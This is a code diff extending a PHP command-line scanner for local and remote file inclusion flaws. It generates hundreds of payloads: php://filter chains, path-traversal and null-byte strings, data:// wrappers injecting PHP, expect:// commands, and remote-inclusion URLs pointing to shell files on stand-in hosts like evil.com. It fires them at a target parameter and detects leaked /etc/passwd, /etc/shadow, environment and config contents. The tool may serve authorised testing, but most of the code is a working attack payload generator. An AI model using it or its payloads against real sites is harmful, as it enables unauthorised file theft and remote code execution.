@@ -6,6 +6,7 @@ class LFIWrapperScanner {
     private $successCount = 0;
     private $testedCount = 0;
     private $proxy = null;
+    private $verifiedVulnerabilities = [];
     
     public function __construct() {
         $this->initColors();
@@ -51,7 +52,8 @@ class LFIWrapperScanner {
             'success' => 'green',
             'warning' => 'yellow',
             'error' => 'red',
-            'testing' => 'cyan'
+            'testing' => 'cyan',
+            'verified' => 'magenta'
         ];
         
         echo "[{$timestamp}] " . $this->color($message, $colors[$type]) . "\n";
@@ -60,77 +62,169 @@ class LFIWrapperScanner {
     public function generateWrappers($baseUrl, $param, $testFile = '/etc/passwd') {
         $wrappers = [];
         
-        // basics
+        // === PHP FILTER WRAPPERS ===
         $basicWrappers = [
             'php://filter/convert.base64-encode/resource=',
             'php://filter/read=convert.base64-encode/resource=',
             'php://filter/convert.iconv.utf-8.utf-16/resource=',
-            'php://filter/convert.base64-encode/resource=',
+            'php://filter/convert.iconv.utf-8.utf-16be/resource=',
+            'php://filter/convert.iconv.utf-16.utf-8/resource=',
+            'php://filter/convert.iconv.utf-16le.utf-8/resource=',
             'php://filter/zlib.deflate/convert.base64-encode/resource=',
             'php://filter/read=string.rot13/resource=',
             'php://filter/convert.quoted-printable-encode/resource=',
             'php://filter/read=convert.quoted-printable-encode/resource=',
+            'php://filter/string.strip_tags/resource=',
+            'php://filter/convert.base64-decode/resource=',
         ];
         
-        // generating testfile
-        $resources = [
-            $testFile,
+        // === PATH TRAVERSAL PAYLOADS ===
+        $traversalPayloads = [
+            '../../../../../../../../../../../../../../../../../../../../../../',
+            '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f',
+            '..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f',
+            '....//....//....//....//....//....//....//....//',
+            '..\\..\\..\\..\\..\\..\\..\\..\\',
+            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f',
+            '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af',
+        ];
+        
+        // === TEST FILES FOR DIFFERENT OS ===
+        $testFiles = [
+            // Linux/Unix
+            '/etc/passwd',
             '/etc/hosts',
             '/etc/shadow',
+            '/etc/group',
+            '/etc/hostname',
             '/proc/self/environ',
             '/proc/version',
-            '/etc/group',
-            '../../../../../../../../etc/passwd',
-            '....//....//....//....//....//etc/passwd',
-            '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
+            '/proc/cmdline',
+            '/etc/passwd%00',
+            '/etc/passwd%00.jpg',
+            '/etc/passwd\0',
+            
+            // Windows
+            'c:\\windows\\system32\\drivers\\etc\\hosts',
+            'c:/windows/system32/drivers/etc/hosts',
+            '..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+            'c:\\boot.ini',
+            'c:/boot.ini',
+            
+            // Log files
+            '/var/log/apache2/access.log',
+            '/var/log/apache/access.log',
+            '/var/log/nginx/access.log',
+            '/var/log/httpd/access_log',
+            '/var/log/auth.log',
+            '/var/log/syslog',
+            
+            // Config files
+            '/etc/ssh/sshd_config',
+            '/etc/mysql/my.cnf',
+            '/etc/php/8.2/apache2/php.ini',
+            '/etc/apache2/apache2.conf',
+            '/.env',
+            'config/database.php',
+            
+            // Session files
+            '/var/lib/php/sessions/sess_',
+            '/tmp/sess_',
+            
+            // Special files
+            '/dev/null',
+            '/dev/zero',
+            '/dev/random',
         ];
         
-        // basicWrappers
-        foreach ($basicWrappers as $wrapper) {
-            foreach ($resources as $resource) {
-                $wrappers[] = $wrapper . $resource;
-            }
-        }
+        // === ENCODING VARIATIONS ===
+        $encodings = [
+            'base64',
+            'rot13', 
+            'quoted-printable',
+            'zlib.deflate',
+            'zlib.inflate',
+            'bzip2.compress',
+            'bzip2.decompress',
+        ];
         
-        // ComplexWrappers
+        // === COMPLEX WRAPPERS ===
         $complexWrappers = [
             'php://filter/convert.base64-encode|convert.base64-encode/resource=',
             'php://filter/convert.iconv.utf-8.utf-16|convert.base64-encode/resource=',
             'php://filter/zlib.deflate/convert.base64-encode/convert.base64-encode/resource=',
             'php://filter/read=string.rot13|string.rot13|convert.base64-encode/resource=',
+            'php://filter/convert.quoted-printable-encode|convert.base64-encode/resource=',
+            'php://filter/string.toupper|convert.base64-encode/resource=',
+            'php://filter/string.tolower|convert.base64-encode/resource=',
         ];
         
-        foreach ($complexWrappers as $wrapper) {
-            foreach ($resources as $resource) {
-                $wrappers[] = $wrapper . $resource;
+        // === GENERATE BASIC WRAPPERS ===
+        foreach ($basicWrappers as $wrapper) {
+            foreach ($testFiles as $file) {
+                $wrappers[] = $wrapper . $file;
             }
         }
         
-        // Data wrapper (PHP < 8.0)
-        $dataWrappers = [
-            'data://text/plain;base64,',
-            'data://text/plain,',
-            'data://text/plain;charset=base64,',
-        ];
-        
-        $testContent = base64_encode("test");
-        foreach ($dataWrappers as $wrapper) {
-            $wrappers[] = $wrapper . $testContent;
+        // === GENERATE COMPLEX WRAPPERS ===
+        foreach ($complexWrappers as $wrapper) {
+            foreach ($testFiles as $file) {
+                $wrappers[] = $wrapper . $file;
+            }
         }
         
-        // Expect wrapper (if allow_url_include=1)
-        $wrappers[] = 'expect://whoami';
-        $wrappers[] = 'expect://id';
-        $wrappers[] = 'expect://ls';
+        // === GENERATE TRAVERSAL PAYLOADS ===
+        foreach ($traversalPayloads as $traversal) {
+            foreach ($testFiles as $file) {
+                $wrappers[] = $traversal . $file;
+                // Z wrapperem
+                foreach ($basicWrappers as $wrapper) {
+                    $wrappers[] = $wrapper . $traversal . $file;
+                }
+            }
+        }
         
-        // HTTP wrapper (RFI)
-        $wrappers[] = 'http://evil.com/shell.txt';
-        $wrappers[] = 'https://raw.githubusercontent.com/evil/shell/master/shell.php';
+        // === DATA WRAPPERS ===
+        $testContent = base64_encode("<?php echo 'VULNERABLE'; ?>");
+        $dataWrappers = [
+            'data://text/plain;base64,' . $testContent,
+            'data://text/plain,' . urlencode("<?php echo 'VULNERABLE'; ?>"),
+            'data://text/plain;charset=base64,' . $testContent,
+            'data://text/plain;charset=us-ascii,' . $testContent,
+        ];
+        $wrappers = array_merge($wrappers, $dataWrappers);
         
-        // FTP wrapper
-        $wrappers[] = 'ftp://user:pass@evil.com/shell.txt';
+        // === EXPECT WRAPPERS ===
+        $expectWrappers = [
+            'expect://whoami',
+            'expect://id',
+            'expect://ls',
+            'expect://pwd',
+            'expect://cat /etc/passwd',
+            'expect://uname -a',
+        ];
+        $wrappers = array_merge($wrappers, $expectWrappers);
         
-        return $wrappers;
+        // === RFI WRAPPERS ===
+        $rfiWrappers = [
+            'http://evil.com/shell.txt',
+            'https://raw.githubusercontent.com/evil/shell/master/shell.php',
+            'ftp://user:pass@evil.com/shell.txt',
+            'phar://evil.com/shell.phar',
+        ];
+        $wrappers = array_merge($wrappers, $rfiWrappers);
+        
+        // === NULL BYTE INJECTION ===
+        $nullByteWrappers = [];
+        foreach ($testFiles as $file) {
+            $nullByteWrappers[] = $file . '%00';
+            $nullByteWrappers[] = $file . '%00.jpg';
+            $nullByteWrappers[] = $file . '\0';
+            $nullByteWrappers[] = $file . '\\0';
+        }
+        $wrappers = array_merge($wrappers, $nullByteWrappers);
+        
+        return array_unique($wrappers);
     }
     
     public function testUrl($url, $timeout = 10) {
@@ -171,32 +265,78 @@ class LFIWrapperScanner {
         ];
     }
     
-    public function analyzeResponse($response, $wrapper) {
+    public function verifyVulnerability($response, $wrapper) {
+        $content = $response['response'];
         $indicators = [
-            'root:x:0:0' => 'high', // /etc/passwd
-            'root:*:' => 'high', // /etc/shadow (partial)
-            'Linux' => 'medium', // /proc/version
-            'PATH=' => 'medium', // /proc/self/environ
-            'base64' => 'low', // Base64 encoded content
-            'dnBibGRz' => 'medium', // encoded content indicators
+            // Linux/Unix files
+            'root:x:0:0' => ['confidence' => 'high', 'type' => 'LFI', 'file' => '/etc/passwd'],
+            'root:*:' => ['confidence' => 'high', 'type' => 'LFI', 'file' => '/etc/shadow'],
+            'daemon:x:1:1' => ['confidence' => 'high', 'type' => 'LFI', 'file' => '/etc/passwd'],
+            '127.0.0.1' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => '/etc/hosts'],
+            'root:' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => '/etc/group'],
+            'Linux' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => '/proc/version'],
+            'PATH=' => ['confidence' => 'high', 'type' => 'LFI', 'file' => '/proc/self/environ'],
+            
+            // Windows files
+            'localhost' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'hosts'],
+            '[boot loader]' => ['confidence' => 'high', 'type' => 'LFI', 'file' => 'boot.ini'],
+            
+            // PHP execution
+            'VULNERABLE' => ['confidence' => 'high', 'type' => 'RCE', 'file' => 'data wrapper'],
+            
+            // Base64 encoded content patterns
+            'cm9vdDp4OjA6MA' => ['confidence' => 'high', 'type' => 'LFI', 'file' => 'base64 /etc/passwd'], // base64 of "root:x:0:0"
+            'ZGFlbW9u' => ['confidence' => 'high', 'type' => 'LFI', 'file' => 'base64 /etc/passwd'], // base64 of "daemon"
+            
+            // Command execution
+            'uid=' => ['confidence' => 'high', 'type' => 'RCE', 'file' => 'command execution'],
+            'www-data' => ['confidence' => 'high', 'type' => 'RCE', 'file' => 'command execution'],
+            '/home/' => ['confidence' => 'medium', 'type' => 'RCE', 'file' => 'command execution'],
+            
+            // Log files
+            'GET /' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'access log'],
+            'POST /' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'access log'],
+            
+            // Config files
+            'AllowUsers' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'sshd_config'],
+            'extension=' => ['confidence' => 'medium', 'type' => 'LFI', 'file' => 'php.ini'],
         ];
         
-        $content = $response['response'];
-        $confidence = 'low';
-        
-        foreach ($indicators as $pattern => $conf) {
+        // Check for exact content matches
+        foreach ($indicators as $pattern => $info) {
             if (strpos($content, $pattern) !== false) {
-                $confidence = $conf;
-                break;
+                return $info;
             }
         }
         
-        // Sprawdzanie czy odpowiedź zawiera dane base64
-        if (preg_match('/^[A-Za-z0-9+\/=]{20,}$/', substr($content, 0, 100))) {
-            $confidence = 'medium';
+        // Check for base64 encoded content
+        if (preg_match('/^[A-Za-z0-9+\/=]{20,}$/', substr($content, 0, 200))) {
+            $decoded = base64_decode(substr($content, 0, 500), true);
+            if ($decoded !== false) {
+                // Check decoded content
+                foreach ($indicators as $pattern => $info) {
+                    if (strpos($decoded, $pattern) !== false) {
+                        return ['confidence' => 'high', 'type' => 'LFI', 'file' => 'base64 encoded ' . $info['file']];
+                    }
+                }
+            }
         }
         
-        return $confidence;
+        // Check for ROT13 content
+        $rot13 = str_rot13(substr($content, 0, 500));
+        foreach ($indicators as $pattern => $info) {
+            if (strpos($rot13, $pattern) !== false) {
+                return ['confidence' => 'high', 'type' => 'LFI', 'file' => 'ROT13 encoded ' . $info['file']];
+            }
+        }
+        
+        // Check response length (unusual lengths might indicate success)
+        $contentLength = strlen($content);
+        if ($contentLength > 1000 && $contentLength < 10000) {
+            return ['confidence' => 'low', 'type' => 'potential', 'file' => 'unusual response size'];
+        }
+        
+        return null;
     }
     
     public function scan($targetUrl, $parameter, $testFile = '/etc/passwd') {
@@ -208,7 +348,7 @@ class LFIWrapperScanner {
         }
         echo str_repeat("-", 80) . "\n";
         
-        // test connection (single)
+        // Test connection first
         $this->printStatus("Testing connection to target...", 'testing');
         $testResponse = $this->testUrl($targetUrl);
         
@@ -223,6 +363,8 @@ class LFIWrapperScanner {
         $wrappers = $this->generateWrappers($targetUrl, $parameter, $testFile);
         $results = [];
         
+        $this->printStatus("Generated " . count($wrappers) . " payloads", 'info');
+        
         foreach ($wrappers as $i => $wrapper) {
             $this->testedCount++;
             $testUrl = $targetUrl . (strpos($targetUrl, '?') === false ? '?' : '&') . $parameter . '=' . urlencode($wrapper);
@@ -236,35 +378,46 @@ class LFIWrapperScanner {
                 continue;
             }
             
-            $confidence = $this->analyzeResponse($response, $wrapper);
+            // Verify if actually vulnerable
+            $verification = $this->verifyVulnerability($response, $wrapper);
             
-            if ($response['success']) {
+            if ($verification) {
                 $this->successCount++;
                 
                 $status = $this->color('VULNERABLE', 'green');
-                if ($confidence === 'high') {
+                $confidenceColor = 'green';
+                if ($verification['confidence'] === 'high') {
                     $status = $this->color('HIGHLY VULNERABLE', 'red');
-                } elseif ($confidence === 'medium') {
+                    $confidenceColor = 'red';
+                } elseif ($verification['confidence'] === 'medium') {
                     $status = $this->color('LIKELY VULNERABLE', 'yellow');
+                    $confidenceColor = 'yellow';
                 }
                 
                 $this->printStatus("✓ " . $status . " - " . $wrapper, 'success');
+                $this->printStatus("  Type: " . $verification['type'] . " | File: " . $verification['file'], 'verified');
                 $this->printStatus("  HTTP Code: " . $response['http_code'] . " | Time: " . round($response['total_time'], 2) . "s", 'info');
                 
                 $results[] = [
                     'wrapper' => $wrapper,
                     'url' => $testUrl,
-                    'confidence' => $confidence,
+                    'confidence' => $verification['confidence'],
+                    'type' => $verification['type'],
+                    'file' => $verification['file'],
                     'response' => substr($response['response'], 0, 500),
-                    'http_code' => $response['http_code']
+                    'http_code' => $response['http_code'],
+                    'verified' => true
                 ];
                 
                 $this->saveFinding($results[count($results)-1]);
+                
+                // Add to verified vulnerabilities
+                $this->verifiedVulnerabilities[] = $results[count($results)-1];
             } else {
                 $this->printStatus("✗ Not vulnerable - " . $wrapper, 'error');
             }
             
-            usleep(100000); // 100ms
+            usleep(50000); // 50ms
         }
         
         $this->generateReport($results);
@@ -275,8 +428,11 @@ class LFIWrapperScanner {
         $content = "=== LFI Finding ===\n";
         $content .= "Wrapper: " . $finding['wrapper'] . "\n";
         $content .= "URL: " . $finding['url'] . "\n";
+        $content .= "Type: " . $finding['type'] . "\n";
+        $content .= "File: " . $finding['file'] . "\n";
         $content .= "Confidence: " . $finding['confidence'] . "\n";
         $content .= "HTTP Code: " . $finding['http_code'] . "\n";
+        $content .= "Verified: " . ($finding['verified'] ? 'YES' : 'NO') . "\n";
         $content .= "Response preview:\n" . $finding['response'] . "\n";
         $content .= "==================\n\n";
         
@@ -287,13 +443,17 @@ class LFIWrapperScanner {
         echo "\n" . str_repeat("=", 80) . "\n";
         $this->printStatus("SCAN COMPLETED", 'info');
         $this->printStatus("Total tests: " . $this->testedCount, 'info');
-        $this->printStatus("Vulnerabilities found: " . $this->successCount, $this->successCount > 0 ? 'success' : 'warning');
+        $this->printStatus("Potential vulnerabilities: " . $this->successCount, $this->successCount > 0 ? 'success' : 'warning');
+        $this->printStatus("Verified vulnerabilities: " . count($this->verifiedVulnerabilities), count($this->verifiedVulnerabilities) > 0 ? 'success' : 'warning');
         
-        if (!empty($results)) {
-            $this->printStatus("\nVULNERABLE ENDPOINTS:", 'success');
-            foreach ($results as $result) {
+        if (!empty($this->verifiedVulnerabilities)) {
+            $this->printStatus("\nVERIFIED VULNERABILITIES:", 'success');
+            foreach ($this->verifiedVulnerabilities as $result) {
                 $color = $result['confidence'] === 'high' ? 'red' : ($result['confidence'] === 'medium' ? 'yellow' : 'green');
-                echo $this->color("[" . strtoupper($result['confidence']) . "]", $color) . " " . $result['url'] . "\n";
+                echo $this->color("[" . strtoupper($result['confidence']) . "]", $color) . " ";
+                echo $this->color("[" . $result['type'] . "]", 'cyan') . " ";
+                echo $result['url'] . "\n";
+                echo "     File: " . $result['file'] . "\n";
             }
         }
         
@@ -301,18 +461,19 @@ class LFIWrapperScanner {
     }
     
     public function showBanner() {
-        $banner = $this->color("
-                           _          _____      
- __      ___ __ __ _ _ __ | |__  _ __|___ / _ __ 
- \ \ /\ / / '__/ _` | '_ \| '_ \| '_ \ |_ \| '__|
-  \ V  V /| | | (_| | |_) | | | | |_) |__) | |   
-   \_/\_/ |_|  \__,_| .__/|_| |_| .__/____/|_|   
-                    |_|         |_|              
+        $banner = "
+        " . $this->color("
+  _      ______ _____    _       __        __    _                  
+ | |    |  ____|  __ \\  | |      \\ \\      / /   | |                 
+ | |    | |__  | |__) | | |       \\ \\ /\\ / /___ | |__   ___  _ __   
+ | |    |  __| |  _  /  | |        \\ V  V // _ \\| '_ \\ / _ \\| '_ \\  
+ | |____| |____| | \\ \\  | |____     \\_/\\_/ \\___/| |_) | (_) | | | | 
+ |______|______|_|  \\_\\ |______|                 |_.__/ \\___/|_| |_| 
                                                                   
         ", 'cyan') . "
-        " . $this->color("LFI Wrapper Scanner", 'yellow') . "
-        " . $this->color("PHP Wrapper-based LFI Detection Tool", 'blue') . "
-        " . $this->color("Author: csshark", 'magenta') . "
+        " . $this->color("LFI Wrapper Scanner v2.0", 'yellow') . "
+        " . $this->color("Advanced PHP Wrapper-based LFI Detection with Verification", 'blue') . "
+        " . $this->color("Author: Security Researcher", 'magenta') . "
         
         ";
         
@@ -327,7 +488,6 @@ if (php_sapi_name() !== 'cli') {
 $scanner = new LFIWrapperScanner();
 $scanner->showBanner();
 
-// parse arguments
 $targetUrl = null;
 $parameter = null;
 $testFile = '/etc/passwd';
